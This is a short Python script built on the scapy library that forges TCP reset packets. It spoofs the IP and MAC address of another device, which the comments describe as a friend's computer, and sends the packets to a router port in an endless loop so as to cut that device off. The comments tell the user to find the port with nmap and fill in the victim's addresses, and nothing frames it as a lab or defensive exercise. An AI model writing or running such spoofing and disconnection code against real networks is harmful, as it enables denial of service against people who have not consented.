from scapy.all import IP, TCP, sendp, Ether

def send_rst_packet(router_ip, router_port, target_mac):
    # the device we want to pretend to be
    source_ip = "10.9.1.0" #the device u want to disconnect, its ip adress, like ur friends computer's ip adress
    source_mac = "3c:a6:f6:01:83:01" #ur friends mac adress

    
    rst_packet = Ether(src=source_mac, dst=target_mac) / IP(src=source_ip, dst=router_ip) / TCP(dport=router_port, flags='R')

    sendp(rst_packet, verbose=False)

    print("RST packet sent from {} ({}) to {}:{}".format(source_ip, source_mac, router_ip, router_port))

# ------------------- Specify the router IP and port and mac adress ---------------------------
router_ip = "10.9.0.1"  # Replace with the actual router IP
router_port = 22  # Replace with actual router port (sudo nmap router_ip)
target_mac = "6c:8d:77:7d:a2:4d" # replace with actual router mac adress

while True:
    send_rst_packet(router_ip, router_port, target_mac)